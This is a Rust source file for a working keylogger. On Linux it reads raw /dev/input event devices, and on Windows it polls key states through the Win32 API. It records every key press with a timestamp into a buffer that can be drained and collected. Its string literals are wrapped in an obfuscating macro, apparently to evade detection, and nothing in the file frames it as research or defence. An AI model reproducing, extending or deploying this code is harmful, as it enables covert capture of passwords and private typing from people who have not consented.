use encstr::astr;
use std::sync::{
    Arc, Mutex,
    atomic::{AtomicBool, Ordering},
};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

pub struct Keylogger {
    data: Arc<Mutex<String>>,
    pub running: Arc<AtomicBool>,
    handle: Option<thread::JoinHandle<()>>,
}

impl Keylogger {
    pub fn new() -> Self {
        Keylogger {
            data: Arc::new(Mutex::new(String::new())),
            running: Arc::new(AtomicBool::new(false)),
            handle: None,
        }
    }

    pub fn start(&mut self) {
        if self.running.load(Ordering::SeqCst) {
            return;
        }
        self.running.store(true, Ordering::SeqCst);
        let data = self.data.clone();
        let running = self.running.clone();
        self.handle = Some(thread::spawn(move || {
            #[cfg(target_os = "linux")]
            keylogger_linux(data, running);
            #[cfg(target_os = "windows")]
            keylogger_windows(data, running);
        }));
    }

    pub fn stop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        if let Some(handle) = self.handle.take() {
            let _ = handle.join();
        }
    }

    pub fn drain_log(&mut self) -> String {
        let mut data = self.data.lock().unwrap();
        let result = data.clone();
        data.clear();
        result
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

fn timestamp() -> String {
    let dur = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    let secs = dur.as_secs();
    let h = (secs / 3600) % 24;
    let m = (secs / 60) % 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02} ", h, m, s)
}

#[cfg(target_os = "linux")]
fn keylogger_linux(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
    use std::fs::{File, read_dir};
    use std::io::Read;
    use std::os::unix::io::AsRawFd;

    let ev_dir = astr!("/dev/input");
    let mut devices: Vec<File> = Vec::new();

    if let Ok(entries) = read_dir(&ev_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with(astr!("event").as_str()) {
                if let Ok(file) = File::open(entry.path()) {
                    devices.push(file);
                }
            }
        }
    }

    let mut bufs: Vec<Vec<u8>> = devices.iter().map(|_| vec![0u8; 24]).collect();

    let mut fds: Vec<libc::pollfd> = devices
        .iter()
        .map(|d| libc::pollfd {
            fd: d.as_raw_fd(),
            events: libc::POLLIN,
            revents: 0,
        })
        .collect();

    while running.load(Ordering::SeqCst) {
        if fds.is_empty() {
            thread::sleep(Duration::from_millis(100));
            continue;
        }

        let ret = unsafe { libc::poll(fds.as_mut_ptr(), fds.len() as libc::nfds_t, 50) };
        if ret < 0 {
            thread::sleep(Duration::from_millis(100));
            continue;
        }
        if ret == 0 {
            continue;
        }

        for (i, pfd) in fds.iter().enumerate() {
            if pfd.revents & libc::POLLIN == 0 {
                continue;
            }
            if let Some(dev) = devices.get_mut(i) {
                if dev.read(&mut bufs[i]).is_ok() {
                    let ev = &bufs[i];
                    if ev.len() < 24 {
                        continue;
                    }
                    let type_ = u16::from_ne_bytes([ev[16], ev[17]]);
                    let code = u16::from_ne_bytes([ev[18], ev[19]]);
                    let value = i32::from_ne_bytes([ev[20], ev[21], ev[22], ev[23]]);

                    if type_ == 1 && value == 1 {
                        let ch = linux_key_to_char(code);
                        if !ch.is_empty() {
                            let mut d = data.lock().unwrap();
                            d.push_str(&timestamp());
                            d.push_str(&ch);
                            d.push('\n');
                        }
                    }
                }
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn linux_key_to_char(code: u16) -> String {
    match code {
        1 => astr!("[ESC]"),
        2 => astr!("1"),
        3 => astr!("2"),
        4 => astr!("3"),
        5 => astr!("4"),
        6 => astr!("5"),
        7 => astr!("6"),
        8 => astr!("7"),
        9 => astr!("8"),
        10 => astr!("9"),
        11 => astr!("0"),
        12 => astr!("-"),
        13 => astr!("="),
        14 => astr!("[BACKSPACE]"),
        15 => astr!("[TAB]"),
        16 => astr!("q"),
        17 => astr!("w"),
        18 => astr!("e"),
        19 => astr!("r"),
        20 => astr!("t"),
        21 => astr!("y"),
        22 => astr!("u"),
        23 => astr!("i"),
        24 => astr!("o"),
        25 => astr!("p"),
        26 => astr!("["),
        27 => astr!("]"),
        28 => astr!("[ENTER]"),
        29 => astr!("[LCTRL]"),
        30 => astr!("a"),
        31 => astr!("s"),
        32 => astr!("d"),
        33 => astr!("f"),
        34 => astr!("g"),
        35 => astr!("h"),
        36 => astr!("j"),
        37 => astr!("k"),
        38 => astr!("l"),
        39 => astr!(";"),
        40 => astr!("'"),
        41 => astr!("`"),
        42 => astr!("[LSHIFT]"),
        43 => astr!("\\"),
        44 => astr!("z"),
        45 => astr!("x"),
        46 => astr!("c"),
        47 => astr!("v"),
        48 => astr!("b"),
        49 => astr!("n"),
        50 => astr!("m"),
        51 => astr!(","),
        52 => astr!("."),
        53 => astr!("/"),
        54 => astr!("[RSHIFT]"),
        55 => astr!("*"),
        56 => astr!("[LALT]"),
        57 => astr!(" "),
        58 => astr!("[CAPS]"),
        59 => astr!("[F1]"),
        60 => astr!("[F2]"),
        61 => astr!("[F3]"),
        62 => astr!("[F4]"),
        63 => astr!("[F5]"),
        64 => astr!("[F6]"),
        65 => astr!("[F7]"),
        66 => astr!("[F8]"),
        67 => astr!("[F9]"),
        68 => astr!("[F10]"),
        69 => astr!("[F11]"),
        70 => astr!("[F12]"),
        71 => astr!("[SCROLLLOCK]"),
        72 => astr!("[HOME]"),
        73 => astr!("[UP]"),
        74 => astr!("[PGUP]"),
        75 => astr!("-"),
        76 => astr!("[LEFT]"),
        77 => astr!("[CENTER]"),
        78 => astr!("[RIGHT]"),
        79 => astr!("+"),
        80 => astr!("[END]"),
        81 => astr!("[DOWN]"),
        82 => astr!("[PGDN]"),
        83 => astr!("[INS]"),
        84 => astr!("[DEL]"),
        85 => astr!(""),
        86 => astr!("\\"),
        87 => astr!("[F11]"),
        88 => astr!("[F12]"),
        89 => astr!("[PAUSE]"),
        90 => astr!("[INSERT]"),
        91 => astr!("[HOME]"),
        92 => astr!("[PGUP]"),
        93 => astr!("[DEL]"),
        94 => astr!("[END]"),
        95 => astr!("[PGDN]"),
        96 => astr!("[RIGHT]"),
        97 => astr!("[LEFT]"),
        98 => astr!("[DOWN]"),
        99 => astr!("[UP]"),
        100 => astr!("[NUMLOCK]"),
        101 => astr!("/"),
        102 => astr!("*"),
        103 => astr!("-"),
        104 => astr!("+"),
        105 => astr!("[ENTER]"),
        106 => astr!("1"),
        107 => astr!("2"),
        108 => astr!("3"),
        109 => astr!("4"),
        110 => astr!("5"),
        111 => astr!("6"),
        112 => astr!("7"),
        113 => astr!("8"),
        114 => astr!("9"),
        115 => astr!("0"),
        116 => astr!("."),
        117 => astr!("\\"),
        118 => astr!("[COMPOSE]"),
        119 => astr!("[POWER]"),
        120 => astr!("="),
        121 => astr!("[F13]"),
        122 => astr!("[F14]"),
        123 => astr!("[F15]"),
        124 => astr!("[F16]"),
        125 => astr!("[F17]"),
        126 => astr!("[F18]"),
        127 => astr!("[F19]"),
        128 => astr!("[F20]"),
        129 => astr!("[F21]"),
        130 => astr!("[F22]"),
        131 => astr!("[F23]"),
        132 => astr!("[F24]"),
        _ => astr!(""),
    }
}

#[cfg(target_os = "windows")]
fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
    use winapi::shared::minwindef::UINT;
    use winapi::um::winuser::GetKeyboardState;
    use winapi::um::winuser::{
        GetAsyncKeyState, VK_APPS, VK_CAPITAL, VK_CONTROL, VK_LWIN, VK_MENU, VK_RWIN, VK_SHIFT,
    };

    let keys: Vec<UINT> = (8u16..=255u16).map(|x| x as UINT).collect();
    let mut prev_state = vec![false; 256];

    while running.load(Ordering::SeqCst) {
        let mut caps_lock = false;
        let mut shift_pressed = false;
        let mut ctrl_pressed = false;
        let mut alt_pressed = false;

        let mut key_state: [u8; 256] = [0; 256];
        unsafe {
            if GetKeyboardState(key_state.as_mut_ptr()) != 0 {
                caps_lock = (key_state[VK_CAPITAL as usize] & 1) != 0;
            }
        }

        for &vk in &keys {
            if !running.load(Ordering::SeqCst) {
                return;
            }

            let vk_idx = vk as usize;
            if vk_idx >= 256 {
                continue;
            }

            let state = unsafe { GetAsyncKeyState(vk as i32) as i32 };
            let is_pressed = (state & 0x8000) != 0;
            let was_pressed = prev_state[vk_idx];

            if is_pressed && !was_pressed {
                match vk as i32 {
                    VK_SHIFT => {
                        shift_pressed = true;
                        continue;
                    }
                    VK_CONTROL => {
                        ctrl_pressed = true;
                        continue;
                    }
                    VK_MENU => {
                        alt_pressed = true;
                        continue;
                    }
                    VK_LWIN | VK_RWIN => {
                        continue;
                    }
                    VK_APPS => {
                        continue;
                    }
                    _ => {}
                }

                let ch = windows_vk_to_char(vk as u32, shift_pressed, caps_lock);
                if !ch.is_empty() {
                    let mut d = data.lock().unwrap();
                    d.push_str(&timestamp());
                    d.push_str(&ch);
                    d.push('\n');
                }
            }

            match vk as i32 {
                VK_SHIFT => shift_pressed = is_pressed,
                VK_CONTROL => ctrl_pressed = is_pressed,
                VK_MENU => alt_pressed = is_pressed,
                _ => {}
            }

            prev_state[vk_idx] = is_pressed;
        }
        thread::sleep(Duration::from_millis(10));
    }
}

#[cfg(target_os = "windows")]
fn windows_vk_to_char(vk: u32, shift: bool, caps: bool) -> String {
    match vk {
        0x08 => astr!("[BACKSPACE]"),
        0x09 => astr!("[TAB]"),
        0x0D => astr!("[ENTER]"),
        0x1B => astr!("[ESC]"),
        0x20 => astr!(" "),
        0x21 => astr!("[PGUP]"),
        0x22 => astr!("[PGDN]"),
        0x23 => astr!("[END]"),
        0x24 => astr!("[HOME]"),
        0x25 => astr!("[LEFT]"),
        0x26 => astr!("[UP]"),
        0x27 => astr!("[RIGHT]"),
        0x28 => astr!("[DOWN]"),
        0x2C => astr!("[PRTSCR]"),
        0x2D => astr!("[INS]"),
        0x2E => astr!("[DEL]"),
        0x70..=0x7B => {
            let idx = (vk - 0x70) as usize;
            [
                astr!("[F1]"),
                astr!("[F2]"),
                astr!("[F3]"),
                astr!("[F4]"),
                astr!("[F5]"),
                astr!("[F6]"),
                astr!("[F7]"),
                astr!("[F8]"),
                astr!("[F9]"),
                astr!("[F10]"),
                astr!("[F11]"),
                astr!("[F12]"),
            ][idx].clone()
        }
        0x90 => astr!("[NUMLOCK]"),
        0x91 => astr!("[SCROLL]"),

        0x30..=0x39 => {
            if shift {
                [
                    astr!(")"),
                    astr!("!"),
                    astr!("@"),
                    astr!("#"),
                    astr!("$"),
                    astr!("%"),
                    astr!("^"),
                    astr!("&"),
                    astr!("*"),
                    astr!("("),
                ][(vk - 0x30) as usize].clone()
            } else {
                [
                    astr!("0"),
                    astr!("1"),
                    astr!("2"),
                    astr!("3"),
                    astr!("4"),
                    astr!("5"),
                    astr!("6"),
                    astr!("7"),
                    astr!("8"),
                    astr!("9"),
                ][(vk - 0x30) as usize].clone()
            }
        }

        0x41..=0x5A => {
            let idx = (vk - 0x41) as usize;
            let lower = [
                astr!("a"),
                astr!("b"),
                astr!("c"),
                astr!("d"),
                astr!("e"),
                astr!("f"),
                astr!("g"),
                astr!("h"),
                astr!("i"),
                astr!("j"),
                astr!("k"),
                astr!("l"),
                astr!("m"),
                astr!("n"),
                astr!("o"),
                astr!("p"),
                astr!("q"),
                astr!("r"),
                astr!("s"),
                astr!("t"),
                astr!("u"),
                astr!("v"),
                astr!("w"),
                astr!("x"),
                astr!("y"),
                astr!("z"),
            ][idx].clone();
            let upper = [
                astr!("A"),
                astr!("B"),
                astr!("C"),
                astr!("D"),
                astr!("E"),
                astr!("F"),
                astr!("G"),
                astr!("H"),
                astr!("I"),
                astr!("J"),
                astr!("K"),
                astr!("L"),
                astr!("M"),
                astr!("N"),
                astr!("O"),
                astr!("P"),
                astr!("Q"),
                astr!("R"),
                astr!("S"),
                astr!("T"),
                astr!("U"),
                astr!("V"),
                astr!("W"),
                astr!("X"),
                astr!("Y"),
                astr!("Z"),
            ][idx].clone();
            if shift ^ caps { upper } else { lower }
        }

        0x6A => astr!("*"),
        0x6B => astr!("+"),
        0x6D => astr!("-"),
        0x6E => astr!("."),
        0x6F => astr!("/"),

        0xBA => {
            if shift {
                astr!(":")
            } else {
                astr!(";")
            }
        }
        0xBB => {
            if shift {
                astr!("+")
            } else {
                astr!("=")
            }
        }
        0xBC => {
            if shift {
                astr!("<")
            } else {
                astr!(",")
            }
        }
        0xBD => {
            if shift {
                astr!("_")
            } else {
                astr!("-")
            }
        }
        0xBE => {
            if shift {
                astr!(">")
            } else {
                astr!(".")
            }
        }
        0xBF => {
            if shift {
                astr!("?")
            } else {
                astr!("/")
            }
        }
        0xC0 => {
            if shift {
                astr!("~")
            } else {
                astr!("`")
            }
        }
        0xDB => {
            if shift {
                astr!("{")
            } else {
                astr!("[")
            }
        }
        0xDC => {
            if shift {
                astr!("|")
            } else {
                astr!("\\")
            }
        }
        0xDD => {
            if shift {
                astr!("}")
            } else {
                astr!("]")
            }
        }
        0xDE => {
            if shift {
                astr!("\"")
            } else {
                astr!("'")
            }
        }

        _ => astr!(""),
    }
}
